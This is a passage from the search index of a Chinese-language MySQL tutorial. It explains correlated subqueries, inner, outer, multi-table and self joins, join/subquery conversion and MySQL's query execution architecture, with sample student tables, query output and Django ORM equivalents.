id_number          | department      | major                    | enrollment_time |\n+----------+-----------+------+--------------------+-----------------+--------------------------+-----------------+\n| 20180101 | \u675c\u5b50\u817e    | \u7537   | 158177199901044792 | \u8ba1\u7b97\u673a\u5b66\u9662      | \u8ba1\u7b97\u673a\u79d1\u5b66\u4e0e\u5de5\u7a0b         | 2018-09-01      |\n| 20180102 | \u675c\u7426\u71d5    | \u5973   | 151008199801178529 | \u8ba1\u7b97\u673a\u5b66\u9662      | \u8ba1\u7b97\u673a\u79d1\u5b66\u4e0e\u5de5\u7a0b         | 2018-09-01      |\n| 20180103 | \u8303\u7edf      | \u7537   | 17156319980116959X | \u8ba1\u7b97\u673a\u5b66\u9662      | \u8f6f\u4ef6\u5de5\u7a0b                 | 2018-09-01      |\n| 20180104 | \u53f2\u73cd\u9999    | \u5973   | 141992199701078600 | \u8ba1\u7b97\u673a\u5b66\u9662      | \u8f6f\u4ef6\u5de5\u7a0b                 | 2018-09-01      |\n+----------+-----------+------+--------------------+-----------------+--------------------------+-----------------+\n4 rows in set (0.00 sec)\n</code></pre></p> <p>\u8fd9\u4e2a\u76f8\u5173\u5b50\u67e5\u8be2\u7684\u67e5\u8be2\u8fc7\u7a0b\u662f:\u5148\u6267\u884c\u5916\u5c42\u67e5\u8be2\u83b7\u5f97\u5230student_info\u8868\u7684\u7b2c\u4e00\u6761\u8bb0\u5f55\uff0c\u53d1\u73b0\u5b83\u7684number\u503c\u662f20180101\u3002\u628a20180101\u5f53\u4f5c\u53c2\u6570\u4f20\u5165\u5230\u5b50\u67e5\u8be2\uff0c\u6b64\u65f6\u5b50\u67e5\u8be2\u7684\u610f\u601d\u662f\u5224\u65adstudent_score\u8868\u7684number\u5b57\u6bb5\u662f\u5426\u670920180101\u8fd9\u4e2a\u503c\u5b58\u5728\uff0c\u5b50\u67e5\u8be2\u7684\u7ed3\u679c\u662f\u8be5\u503c\u5b58\u5728\uff0c\u6240\u4ee5\u6574\u4e2aEXISTS\u8868\u8fbe\u5f0f\u7684\u503c\u4e3aTRUE\uff0c\u90a3\u4e48student_info\u8868\u7684\u7b2c\u4e00\u6761\u8bb0\u5f55\u53ef\u4ee5\u88ab\u52a0\u5165\u5230\u7ed3\u679c\u96c6\u3002\u6bcf\u6761\u8bb0\u5f55\u4f9d\u6b21\u6309\u8fd9\u4e2a\u8fc7\u7a0b\u6267\u884c\u3002</p> <p>\u6b64\u5916\uff0c\u5b50\u67e5\u8be2\u8fd8\u53ef\u4ee5\u5e94\u7528\u4e8e\u540c\u4e00\u4e2a\u8868\uff0c\u6bd4\u5982\u6211\u4eec\u53bb\u67e5student_score\u8868\u4e2d\u5206\u6570\u5927\u4e8e\u5e73\u5747\u5206\u7684\u8bb0\u5f55\uff0c\u7b2c\u4e00\u5370\u8c61\u53ef\u80fd\u662f\u5982\u4e0b\u5199\u6cd5: <pre><code>mysql&gt; select * from student_score where score &gt; avg(score);\nERROR 1111 (HY000): Invalid use of group function\n</code></pre></p> <p>\u5b9e\u9645\u5e94\u8be5\u4f7f\u7528\u5b50\u67e5\u8be2\u6765\u5b9e\u73b0: <pre><code>mysql&gt; select * from student_score where score &gt; (select avg(score) from student_score);\n+----------+-----------------------------+-------+\n| number   | subject                     | score |\n+----------+-----------------------------+-------+\n| 20180101 | \u6bcd\u732a\u7684\u4ea7\u540e\u62a4\u7406              |    78 |\n| 20180101 | \u8bba\u8428\u8fbe\u59c6\u7684\u6218\u4e89\u51c6\u5907          |    88 |\n| 20180102 | \u6bcd\u732a\u7684\u4ea7\u540e\u62a4\u7406              |   100 |\n| 20180102 | \u8bba\u8428\u8fbe\u59c6\u7684\u6218\u4e89\u51c6\u5907          |    98 |\n+----------+-----------------------------+-------+\n4 rows in set (0.00 sec)\n</code></pre> \u56e0\u4e3a\u805a\u96c6\u51fd\u6570\u4e0d\u80fd\u7528\u4e8eWHERE\u5b50\u53e5\uff0c\u53ef\u4ee5\u628a\u4e0a\u8ff0\u5199\u6cd5\u770b\u505a\u662f\u7ed9student_score\u505a\u4e86\u4e00\u4e2a\u526f\u672c\u3002</p>"},{"location":"mysql/query/#_27","title":"\u8fde\u63a5\u67e5\u8be2","text":""},{"location":"mysql/query/#_28","title":"\u57fa\u7840\u6982\u5ff5","text":"<p>\u8fde\u63a5\u7684\u672c\u8d28\u5c31\u662f\u5c06\u5404\u4e2a\u8868\u4e2d\u7684\u8bb0\u5f55\u90fd\u62c9\u53d6\u51fa\u6765\uff0c\u4f9d\u6b21\u5339\u914d\u7ec4\u5408\u5f62\u6210\u4e00\u4e2a\u7ed3\u679c\u96c6\uff0c\u4e5f\u5c31\u662f\u7b1b\u5361\u5c14\u79ef\u7684\u65b9\u5f0f\u3002</p> <p>\u6211\u4eec\u6765\u770b\u4e00\u4e2a\u793a\u4f8b: <pre><code>mysql&gt; create table t1(m1 int, n1 char(1));\nQuery OK, 0 rows affected (0.02 sec)\n\nmysql&gt; create table t2(m2 int, n2 char(1));\nQuery OK, 0 rows affected (0.02 sec)\n\nmysql&gt; insert into t1 values(1, 'a'),(2, 'b'),(3, 'c');\nQuery OK, 3 rows affected (0.00 sec)\nRecords: 3  Duplicates: 0  Warnings: 0\n\nmysql&gt; insert into t2 values(2, 'a'),(3, 'b'),(4, 'c');\nQuery OK, 3 rows affected (0.00 sec)\nRecords: 3  Duplicates: 0  Warnings: 0\n</code></pre></p> <p>\u65b0\u5efa\u4e86\u4e24\u4e2a\u8868\uff0c\u5e76\u5404\u63d2\u5165\u4e86\u4e09\u6761\u6570\u636e\uff0c\u90a3\u4e48\u8fde\u63a5\u53ef\u4ee5\u8fd9\u6837\u505a: <pre><code>mysql&gt; select * from t1,t2;\n+------+------+------+------+\n| m1   | n1   | m2   | n2   |\n+------+------+------+------+\n|    1 | a    |    2 | a    |\n|    2 | b    |    2 | a    |\n|    3 | c    |    2 | a    |\n|    1 | a    |    3 | b    |\n|    2 | b    |    3 | b    |\n|    3 | c    |    3 | b    |\n|    1 | a    |    4 | c    |\n|    2 | b    |    4 | c    |\n|    3 | c    |    4 | c    |\n+------+------+------+------+\n9 rows in set (0.00 sec)\n</code></pre></p> <p>\u4f7f\u7528\u4ee5\u4e0b\u5199\u6cd5\u8fde\u63a5\u90fd\u662f\u53ef\u4ee5\u7684:</p> <ul> <li><code>select t1.m1,t1.n1,t2.m2,t2.n2 from t1, t2</code></li> <li><code>select m1,n1,m2,n2 from t1, t2</code></li> <li><code>select t1.*,t2.* from t1, t2</code></li> </ul>"},{"location":"mysql/query/#_29","title":"\u5185\u5916\u8fde\u63a5","text":"<p>\u73b0\u5728\u6211\u4eec\u60f3\u901a\u8fc7\u4e00\u6761\u8bed\u53e5\u65e2\u67e5\u5230\u5b66\u751f\u7684\u57fa\u672c\u4fe1\u606f\uff0c\u53c8\u67e5\u5230\u4ed6\u7684\u6210\u7ee9\u4fe1\u606f:</p> MySQLDjango ORM <pre><code>mysql&gt; select student_info.number,name,sex,subject,score from student_info, student_score where student_info.number = student_score.number;\n</code></pre> <pre><code>StudentScore.objects.values('number__name','number__name','number__sex','subject','score')\n</code></pre> result<pre><code>+----------+-----------+------+-----------------------------+-------+\n| number   | name      | sex  | subject                     | score |\n+----------+-----------+------+-----------------------------+-------+\n| 20180101 | \u675c\u5b50\u817e    | \u7537   | \u6bcd\u732a\u7684\u4ea7\u540e\u62a4\u7406              |    78 |\n| 20180101 | \u675c\u5b50\u817e    | \u7537   | \u8bba\u8428\u8fbe\u59c6\u7684\u6218\u4e89\u51c6\u5907          |    88 |\n| 20180102 | \u675c\u7426\u71d5    | \u5973   | \u6bcd\u732a\u7684\u4ea7\u540e\u62a4\u7406              |   100 |\n| 20180102 | \u675c\u7426\u71d5    | \u5973   | \u8bba\u8428\u8fbe\u59c6\u7684\u6218\u4e89\u51c6\u5907          |    98 |\n| 20180103 | \u8303\u7edf      | \u7537   | \u6bcd\u732a\u7684\u4ea7\u540e\u62a4\u7406              |    59 |\n| 20180103 | \u8303\u7edf      | \u7537   | \u8bba\u8428\u8fbe\u59c6\u7684\u6218\u4e89\u51c6\u5907          |    61 |\n| 20180104 | \u53f2\u73cd\u9999    | \u5973   | \u6bcd\u732a\u7684\u4ea7\u540e\u62a4\u7406              |    55 |\n| 20180104 | \u53f2\u73cd\u9999    | \u5973   | \u8bba\u8428\u8fbe\u59c6\u7684\u6218\u4e89\u51c6\u5907          |    46 |\n+----------+-----------+------+-----------------------------+-------+\n8 rows in set (0.00 sec)\n</code></pre> <p>\u8fd9\u65f6\u5019\u6211\u4eec\u53d1\u73b0\u6709\u4e24\u4e2a\u4eba\u6ca1\u6709\u6210\u7ee9\uff0c\u6240\u4ee5\u4ed6\u4eec\u6ca1\u6709\u663e\u793a\u5728\u67e5\u8be2\u7ed3\u679c\u4e2d\u3002\u4e3a\u4e86\u6709\u529e\u6cd5\u8ba9\u5176\u663e\u793a\u51fa\uff0c\u5c31\u6709\u4e86\u5185\u8fde\u63a5\u548c\u5916\u8fde\u63a5\u7684\u6982\u5ff5:</p> <ul> <li>\u5185\u8fde\u63a5\u5c31\u662f\u6211\u4eec\u4e4b\u524d\u4f7f\u7528\u7684\uff0c\u6ca1\u6709\u5339\u914d\u7684\u8bb0\u5f55\u5219\u7ed3\u679c\u4e0d\u4f1a\u52a0\u5165\u5230\u6700\u540e\u7684\u7ed3\u679c\u96c6</li> <li>\u5bf9\u4e8e\u5916\u8fde\u63a5\u7684\u4e24\u4e2a\u8868\uff0c\u9a71\u52a8\u8868\u4e2d\u7684\u8bb0\u5f55\u5373\u4f7f\u5728\u88ab\u9a71\u52a8\u8868\u4e2d\u6ca1\u6709\u5339\u914d\u7684\u8bb0\u5f55\uff0c\u4e5f\u4ecd\u7136\u9700\u8981\u52a0\u5165\u5230\u7ed3\u679c\u96c6</li> </ul> <p>\u800c\u5916\u8fde\u63a5\u53c8\u5206\u4e3a\u5de6\u5916\u8fde\u63a5\uff0c\u5373\u5de6\u4fa7\u7684\u8868\u4e3a\u9a71\u52a8\u8868\u3002\u53f3\u5916\u8fde\u63a5\uff0c\u5373\u53f3\u4fa7\u7684\u8868\u4e3a\u9a71\u52a8\u8868\u3002</p> <p>\u6b64\u5916\uff0cWHERE\u5b50\u53e5\u4e0d\u8bba\u5185\u5916\u8fde\u63a5\uff0c\u51e1\u662f\u4e0d\u7b26\u5408WHERE\u6761\u4ef6\u7684\u8bb0\u5f55\u90fd\u4e0d\u4f1a\u5728\u6700\u540e\u7684\u7ed3\u679c\u96c6\u4e2d\u3002\u800c\u5bf9\u4e8e\u5916\u8fde\u63a5\u7684\u9a71\u52a8\u8868\uff0cON\u53ef\u4ee5\u5c06\u88ab\u9a71\u52a8\u8868\u4e2d\u627e\u4e0d\u5230\u8bb0\u5f55\u7684\u5bf9\u5e94\u9a71\u52a8\u8868\u8bb0\u5f55\u52a0\u5165\u5230\u7ed3\u679c\u96c6\uff0c\u5185\u8fde\u63a5\u4e2dWHERE\u5b50\u53e5\u548cON\u5b50\u53e5\u662f\u7b49\u4ef7\u7684\u3002\u6240\u4ee5\u6211\u4eec\u4e00\u822c\u4f1a\u628aWHERE\u7528\u4e8e\u6d89\u53ca\u5355\u8868\u7684\u8fc7\u6ee4\u6761\u4ef6\uff0cON\u7528\u4e8e\u6d89\u53ca\u591a\u8868\u7684\u8fc7\u6ee4\u6761\u4ef6\u3002</p> <p>\u5916\u8fde\u63a5\u7684\u6807\u51c6\u8bed\u6cd5\u4e3a: <code>select * from t1 left/right [outer] join t2 on \u8fde\u63a5\u6761\u4ef6 [where \u666e\u901a\u8fc7\u6ee4\u6761\u4ef6]</code>\uff0couter\u548cwhere\u53ef\u7701\u7565\u3002</p> <p>\u4e0a\u4f8b\u4e2d\u4f7f\u7528\u5916\u8fde\u63a5\u7684\u7ed3\u679c\u4e3a:</p> MySQLDjango ORM <pre><code>mysql&gt; select student_info.number,name,sex,subject,score from student_info left join student_score on student_info.number = student_score.number;\n</code></pre> <pre><code>StudentInfo.objects.values('number', 'name','sex','studentscore__subject','studentscore__score')\n</code></pre> result<pre><code>+----------+-----------+------+-----------------------------+-------+\n| number   | name      | sex  | subject                     | score |\n+----------+-----------+------+-----------------------------+-------+\n| 20180101 | \u675c\u5b50\u817e    | \u7537   | \u6bcd\u732a\u7684\u4ea7\u540e\u62a4\u7406              |    78 |\n| 20180101 | \u675c\u5b50\u817e    | \u7537   | \u8bba\u8428\u8fbe\u59c6\u7684\u6218\u4e89\u51c6\u5907          |    88 |\n| 20180102 | \u675c\u7426\u71d5    | \u5973   | \u6bcd\u732a\u7684\u4ea7\u540e\u62a4\u7406              |   100 |\n| 20180102 | \u675c\u7426\u71d5    | \u5973   | \u8bba\u8428\u8fbe\u59c6\u7684\u6218\u4e89\u51c6\u5907          |    98 |\n| 20180103 | \u8303\u7edf      | \u7537   | \u6bcd\u732a\u7684\u4ea7\u540e\u62a4\u7406              |    59 |\n| 20180103 | \u8303\u7edf      | \u7537   | \u8bba\u8428\u8fbe\u59c6\u7684\u6218\u4e89\u51c6\u5907          |    61 |\n| 20180104 | \u53f2\u73cd\u9999    | \u5973   | \u6bcd\u732a\u7684\u4ea7\u540e\u62a4\u7406              |    55 |\n| 20180104 | \u53f2\u73cd\u9999    | \u5973   | \u8bba\u8428\u8fbe\u59c6\u7684\u6218\u4e89\u51c6\u5907          |    46 |\n| 20180105 | \u8303\u5251      | \u7537   | NULL                        |  NULL |\n| 20180106 | \u6731\u9038\u7fa4    | \u7537   | NULL                        |  NULL |\n+----------+-----------+------+-----------------------------+-------+\n10 rows in set (0.00 sec)\n</code></pre> <p>\u5185\u8fde\u63a5\u4ee5\u4e0b\u7684\u5199\u6cd5\u662f\u7b49\u4ef7\u7684:</p> <ul> <li><code>select * from t1, t2</code></li> <li><code>select * from t1 join t2</code></li> <li><code>select * from t1 inner join t2</code></li> <li><code>select * from t1 cross join t2</code></li> </ul> <p>\u7efc\u4e0a\uff0c\u6211\u4eec\u603b\u7ed3\u4ee5\u4e0b\u4e09\u79cd\u8fde\u63a5\u7684\u7ed3\u679c\u5dee\u5f02: <pre><code>mysql&gt; select * from t1 inner join t2 on t1.m1=t2.m2;\n+------+------+------+------+\n| m1   | n1   | m2   | n2   |\n+------+------+------+------+\n|    2 | b    |    2 | a    |\n|    3 | c    |    3 | b    |\n+------+------+------+------+\n2 rows in set (0.00 sec)\n\nmysql&gt; select * from t1 left join t2 on t1.m1=t2.m2;\n+------+------+------+------+\n| m1   | n1   | m2   | n2   |\n+------+------+------+------+\n|    2 | b    |    2 | a    |\n|    3 | c    |    3 | b    |\n|    1 | a    | NULL | NULL |\n+------+------+------+------+\n3 rows in set (0.00 sec)\n\nmysql&gt; select * from t1 right join t2 on t1.m1=t2.m2;\n+------+------+------+------+\n| m1   | n1   | m2   | n2   |\n+------+------+------+------+\n|    2 | b    |    2 | a    |\n|    3 | c    |    3 | b    |\n| NULL | NULL |    4 | c    |\n+------+------+------+------+\n3 rows in set (0.00 sec)\n</code></pre></p>"},{"location":"mysql/query/#_30","title":"\u591a\u8868\u8fde\u63a5","text":"<p>\u6211\u4eec\u53ef\u4ee5\u8fde\u63a5\u4efb\u610f\u6570\u91cf\u7684\u8868\uff0c\u6211\u4eec\u518d\u52a0\u5165\u4e00\u5f20\u8868\u8bd5\u9a8c: <pre><code>mysql&gt; create table t3(m3 int, n3 char(1));\nQuery OK, 0 rows affected (0.07 sec)\n\nmysql&gt; insert into t3 values(3, 'a'),(3, 'b'),(4, 'c');\nQuery OK, 3 rows affected (0.01 sec)\nRecords: 3  Duplicates: 0  Warnings: 0\n</code></pre></p> <p>\u6211\u4eec\u4f7f\u7528\u4e0b\u9762\u7684\u8bed\u6cd5\u67e5\u8be2\u662f\u7b49\u4ef7\u7684:</p> <ul> <li><code>select * from t1 inner join t2 inner join t3 where t1.m1=t2.m2 and t2.m2=t3.m3;</code></li> <li><code>select * from t1 inner join t2 on t1.m1=t2.m2 inner join t3 on t1.m1=t3.m3;</code></li> </ul> <p>\u67e5\u8be2\u7ed3\u679c: <pre><code>mysql&gt; select * from t1 inner join t2 on t1.m1=t2.m2 inner join t3 on t1.m1=t3.m3;\n+------+------+------+------+------+------+\n| m1   | n1   | m2   | n2   | m3   | n3   |\n+------+------+------+------+------+------+\n|    3 | c    |    3 | b    |    3 | a    |\n|    3 | c    |    3 | b    |    3 | b    |\n+------+------+------+------+------+------+\n2 rows in set (0.00 sec)\n</code></pre> \u4e5f\u53ef\u4ee5\u7528\u4f2a\u4ee3\u7801\u6765\u63cf\u8ff0: <pre><code>for each_row in t1{\n    for each_row in t2 which t1.m1=t2.m2{\n        for each_row in t3 which t2.m2=t3.m3{\n            add_result(each_row)\n        }\n    }\n}\n</code></pre></p>"},{"location":"mysql/query/#_31","title":"\u81ea\u8fde\u63a5","text":"<p>\u6211\u4eec\u65e0\u6cd5\u76f4\u63a5\u81ea\u8fde\u63a5\uff0c\u4f46\u53ef\u4ee5\u901a\u8fc7\u522b\u540d: <pre><code>mysql&gt; select * from t1, t1;\nERROR 1066 (42000): Not unique table/alias: 't1'\nmysql&gt; select * from t1 as table1, t1 as table2;\n+------+------+------+------+\n| m1   | n1   | m1   | n1   |\n+------+------+------+------+\n|    1 | a    |    1 | a    |\n|    2 | b    |    1 | a    |\n|    3 | c    |    1 | a    |\n|    1 | a    |    2 | b    |\n|    2 | b    |    2 | b    |\n|    3 | c    |    2 | b    |\n|    1 | a    |    3 | c    |\n|    2 | b    |    3 | c    |\n|    3 | c    |    3 | c    |\n+------+------+------+------+\n9 rows in set (0.00 sec)\n</code></pre></p> <p>\u800c\u81ea\u8fde\u63a5\u7684\u610f\u4e49\uff0c\u6bd4\u5982\u8981\u67e5\u8be2\u4e0e'\u8303\u7edf'\u7684\u4e13\u4e1a\u76f8\u540c\u7684\u540c\u5b66: <pre><code>mysql&gt; select * from student_info as s1, student_info as s2 where s1.name='\u8303\u7edf' and s1.major=s2.major;\n+----------+--------+------+--------------------+-----------------+--------------+-----------------+----------+-----------+------+--------------------+-----------------+--------------+-----------------+\n| number   | name   | sex  | id_number          | department      | major        | enrollment_time | number   | name      | sex  | id_number          | department      | major        | enrollment_time |\n+----------+--------+------+--------------------+-----------------+--------------+-----------------+----------+-----------+------+--------------------+-----------------+--------------+-----------------+\n| 20180103 | \u8303\u7edf   | \u7537   | 17156319980116959X | \u8ba1\u7b97\u673a\u5b66\u9662      | \u8f6f\u4ef6\u5de5\u7a0b     | 2018-09-01      | 20180103 | \u8303\u7edf      | \u7537   | 17156319980116959X | \u8ba1\u7b97\u673a\u5b66\u9662      | \u8f6f\u4ef6\u5de5\u7a0b     | 2018-09-01      |\n| 20180103 | \u8303\u7edf   | \u7537   | 17156319980116959X | \u8ba1\u7b97\u673a\u5b66\u9662      | \u8f6f\u4ef6\u5de5\u7a0b     | 2018-09-01      | 20180104 | \u53f2\u73cd\u9999    | \u5973   | 141992199701078600 | \u8ba1\u7b97\u673a\u5b66\u9662      | \u8f6f\u4ef6\u5de5\u7a0b     | 2018-09-01      |\n+----------+--------+------+--------------------+-----------------+--------------+-----------------+----------+-----------+------+--------------------+-----------------+--------------+-----------------+\n2 rows in set (0.00 sec)\n</code></pre></p>"},{"location":"mysql/query/#_32","title":"\u4e0e\u5b50\u67e5\u8be2\u8f6c\u6362","text":"<p>\u6709\u7684\u9700\u6c42\u65e2\u53ef\u4ee5\u7528\u8fde\u63a5\u67e5\u8be2\uff0c\u4e5f\u53ef\u4ee5\u7528\u5b50\u67e5\u8be2:</p> MySQLDjango ORM <pre><code>mysql&gt; select * from student_score where number in (select number from student_info where major='\u8f6f\u4ef6\u5de5\u7a0b');\nmysql&gt; select s2.* from student_score as s2, student_info as s1 where s1.number=s2.number and s1.major='\u8f6f\u4ef6\u5de5\u7a0b';\n</code></pre> <pre><code>StudentScore.objects.filter(number__in=Subquery(StudentInfo.objects.filter(major='\u8f6f\u4ef6\u5de5\u7a0b').values('number')))\nStudentScore.objects.select_related('number').filter(number__major='\u8f6f\u4ef6\u5de5\u7a0b')\n</code></pre> result<pre><code>+----------+-----------------------------+-------+\n| number   | subject                     | score |\n+----------+-----------------------------+-------+\n| 20180103 | \u6bcd\u732a\u7684\u4ea7\u540e\u62a4\u7406              |    59 |\n| 20180103 | \u8bba\u8428\u8fbe\u59c6\u7684\u6218\u4e89\u51c6\u5907          |    61 |\n| 20180104 | \u6bcd\u732a\u7684\u4ea7\u540e\u62a4\u7406              |    55 |\n| 20180104 | \u8bba\u8428\u8fbe\u59c6\u7684\u6218\u4e89\u51c6\u5907          |    46 |\n+----------+-----------------------------+-------+\n4 rows in set (0.00 sec)\n\n+----------+-----------------------------+-------+\n| number   | subject                     | score |\n+----------+-----------------------------+-------+\n| 20180103 | \u6bcd\u732a\u7684\u4ea7\u540e\u62a4\u7406              |    59 |\n| 20180103 | \u8bba\u8428\u8fbe\u59c6\u7684\u6218\u4e89\u51c6\u5907          |    61 |\n| 20180104 | \u6bcd\u732a\u7684\u4ea7\u540e\u62a4\u7406              |    55 |\n| 20180104 | \u8bba\u8428\u8fbe\u59c6\u7684\u6218\u4e89\u51c6\u5907          |    46 |\n+----------+-----------------------------+-------+\n4 rows in set (0.00 sec)\n</code></pre>"},{"location":"mysql/theory/","title":"Mysql\u7684\u539f\u7406","text":""},{"location":"mysql/theory/#_1","title":"\u67e5\u8be2\u6267\u884c\u8fc7\u7a0b","text":"<p>\u4e00\u6761SQL\u67e5\u8be2\u8bed\u53e5\u5728Mysql\u4e2d\u662f\u5982\u4f55\u6267\u884c\u7684\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5b83\u7684\u57fa\u672c\u7ed3\u6784\u56fe\u770b\u5230\u5404\u4e2a\u6a21\u5757\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u8d77\u5230\u7684\u4f5c\u7528:</p> <p></p> <p>Server\u5c42\u5305\u62ec\u8fde\u63a5\u5668\u3001\u67e5\u8be2\u7f13\u5b58\u3001\u5206\u6790\u5668\u3001\u4f18\u5316\u5668\u3001\u6267\u884c\u5668\u7b49\uff0c\u6db5\u76d6Mysql\u5927\u591a\u6570\u6838\u5fc3\u670d\u52a1\u529f\u80fd\uff0c\u4ee5\u53ca\u6240\u6709\u7684\u5185\u7f6e\u51fd\u6570\u3001\u8de8\u5b58\u50a8\u5f15\u64ce\u7684\u529f\u80fd\u5b9e\u73b0(\u5982\u5b58\u50a8\u8fc7\u7a0b\u3001\u89e6\u53d1\u5668\u3001\u89c6\u56fe\u7b49)\u3002\u800c\u5b58\u50a8\u5f15\u64ce\u5c5e\u4e8e\u63d2\u4ef6\u5f0f\u67b6\u6784\uff0c\u652f\u6301InnoDB\u3001MyISAM\u3001Memory\u7b49\u591a\u4e2a\u5b58\u50a8\u5f15\u64ce\uff0c\u4e0d\u540c\u5f15\u64ce\u5171\u7528\u4e00\u4e2aServer\u5c42\u3002</p>"},{"location":"mysql/theory/#_2","title":"\u8fde\u63a5\u5668","text":"<p>\u5ba2\u6237\u7aef\u4e00\u822c\u901a\u8fc7TCP\u4e0e\u670d\u52a1\u7aef\u5efa\u7acb\u8fde\u63a5\uff0c\u7528\u6237\u540d\u5bc6\u7801\u8ba4\u8bc1\u901a\u8fc7\u540e\uff0c\u8fde\u63a5\u5668\u5148\u5230\u6743\u9650\u5217\u8868\u4e2d\u67e5\u51fa\u4f60\u62e5\u6709\u7684\u6743\u9650\uff0c\u4e4b\u540e\u8fd9\u4e2a\u8fde\u63a5\u91cc\u7684\u6743\u9650\u5224\u65ad\u903b\u8f91\u90fd\u4f9d\u8d56\u4e8e\u6b64\u65f6\u8bfb\u53d6\u5230\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\u5bf9\u8fd9\u4e2a\u6743\u9650\u7684\u4fee\u6539\u4e0d\u4f1a\u5f71\u54cd\u5230\u5df2\u7ecf\u6b63\u5728\u8fde\u63a5\u7684\u7528\u6237\u3002</p> <p>\u6b63\u5728\u8fde\u63a5\u7684\u5ba2\u6237\u7aef\u53ef\u4ee5\u8fd9\u6837\u67e5\u770b\u5230: <pre><code>mysql&gt; show processlist;\n+----+------+-----------------+---------+---------+------+----------+------------------+\n| Id | User | Host            | db      | Command | Time | State    | Info             |\n+----+------+-----------------+---------+---------+------+----------+------------------+\n|  4 | root | localhost       | awesome | Query   |    0 | starting | show processlist |\n|  7 | root | localhost:58134 | boss    | Sleep   |    3 |          | NULL             |\n|  8 | root | localhost:58135 | NULL    | Sleep   |    2 |          | NULL             |\n+----+------+-----------------+---------+---------+------+----------+------------------+\n3 rows in set (0.00 sec)\n</code></pre> Command\u5217\u4e2d\u663e\u793a\u4e3aSleep\u5c31\u8868\u793a\u8be5\u8fde\u63a5\u5f53\u524d\u662f\u7a7a\u95f2\u7684\uff0c\u5982\u679c\u8fde\u63a5\u7a7a\u95f2\u592a\u957f\u65f6\u95f4\u5c31\u4f1a\u88ab\u8fde\u63a5\u5668\u81ea\u52a8\u65ad\u5f00\uff0c\u9ed8\u8ba4\u662f8\u5c0f\u65f6\uff0c\u53ef\u901a\u8fc7<code>wait_timeout</code>\u63a7\u5236\u3002</p>"},{"location":"mysql/theory/#_3","title":"\u67e5\u8be2\u7f13\u5b58","text":"<p>\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u5f80\u5f80\u4e0d\u4f7f\u7528\u67e5\u8be2\u7f13\u5b58\uff0c\u56e0\u4e3a\u5b83\u662f\u5f0a\u5927\u4e8e\u5229\u7684\u3002\u5b83\u7684\u5931\u6548\u975e\u5e38\u7684\u9891\u7e41\uff0c\u53ea\u8981\u5bf9\u4e00\u4e2a\u8868\u6709\u66f4\u65b0\uff0c\u8fd9\u4e2a\u8868\u4e0a\u7684\u6240\u6709\u67e5\u8be2\u7f13\u5b58\u90fd\u4f1a\u88ab\u6e05\u7a7a\u3002\u5bf9\u4e8e\u66f4\u65b0\u538b\u529b\u5927\u7684\u6570\u636e\u5e93\u6765\u8bb2\uff0c\u67e5\u8be2\u7f13\u5b58\u7684\u547d\u4e2d\u6548\u7387\u5f88\u4f4e\u3002</p> <p>Mysql8.0\u4ee5\u4e0a\u7248\u672c\u76f4\u63a5\u5c06\u8be5\u529f\u80fd\u5220\u6389\u4e86\uff0c\u6240\u4ee5\u6211\u4eec\u7684\u7ed3\u6784\u56fe\u4e0a\u4e5f\u53ea\u662f\u628a\u5b83\u753b\u6210\u4e00\u6761\u652f\u7ebf\u3002</p>"},{"location":"mysql/theory/#_4","title":"\u5206\u6790\u5668","text":"<p>\u8bcd\u6cd5\u5206\u6790\u5c31\u662f\u6839\u636e\u4e00\u4e9b\u5173\u952e\u8bcd\u5224\u65ad\u51fa\u4f60\u8981\u505a\u4ec0\u4e48\uff0c\u4f8b\u5982<code>select</code>\u8868\u793a\u8fd9\u662f\u4e00\u4e2a\u67e5\u8be2\u8bed\u53e5\u3002\u90a3\u4e48\u63a5\u4e0b\u6765\u5c31\u4f1a\u628a\u5b57\u7b26\u4e32<code>T</code>\u8bc6\u522b\u4e3a\u8868\u540d<code>T</code>\uff0c\u5b57\u7b26\u4e32<code>ID</code>\u8bc6\u522b\u4e3a\u5217\u540d<code>ID</code>\u3002</p> <p>\u63a5\u7740\u8fdb\u884c\u8bed\u6cd5\u5206\u6790\uff0c\u5c31\u662f\u5224\u65ad\u8f93\u5165\u7684\u8bed\u53e5\u662f\u5426\u6ee1\u8db3\u8bed\u6cd5\u89c4\u5219\u3002\u8bed\u6cd5\u9519\u8bef\u7684\u63d0\u793a\u5c31\u662f\u5728\u8fd9\u4e2a\u9636\u6bb5\u89e6\u53d1\u7684\uff0c\u4f8b\u5982<code>You have an error in your SQL syntax</code>\u3002</p>"},{"location":"mysql/theory/#_5","title":"\u4f18\u5316\u5668","text":"<p>\u4f18\u5316\u5668\u662f\u5728\u8868\u91cc\u6709\u591a\u4e2a\u7d22\u5f15\u7684\u65f6\u5019\u51b3\u5b9a\u4f7f\u7528\u54ea\u4e2a\u7d22\u5f15\uff1b\u6216\u8005\u6709\u591a\u8868\u5173\u8054\u7684\u65f6\u5019\u51b3\u5b9a\u5404\u4e2a\u8868\u7684\u8fde\u63a5\u987a\u5e8f\u3002\u4f8b\u5982<code>select * from t1 join t2 using(id) where t1.c=10 and t2.d=20</code>\uff0c\u5c31\u53ef\u4ee5\u6709\u4e24\u79cd\u5904\u7406\u65b9\u5f0f:</p> <ul> <li>\u5148\u4ece\u8868t1\u4e2d\u53d6\u51fac=10\u7684\u8bb0\u5f55\u7684id\uff0c\u6839\u636eid\u5173\u8054\u5230\u8868t2\uff0c\u5224\u65adt2\u4e2dd\u7684\u503c\u662f\u5426\u4e3a20</li> <li>\u5148\u4ece\u8868t2\u4e2d\u53d6\u51fad=20\u7684\u8bb0\u5f55\u7684id\uff0c\u6839\u636eid\u5173\u8054\u5230\u8868t1\uff0c\u5224\u65adt1\u4e2dc\u7684\u503c\u662f\u5426\u4e3a10</li> </ul> 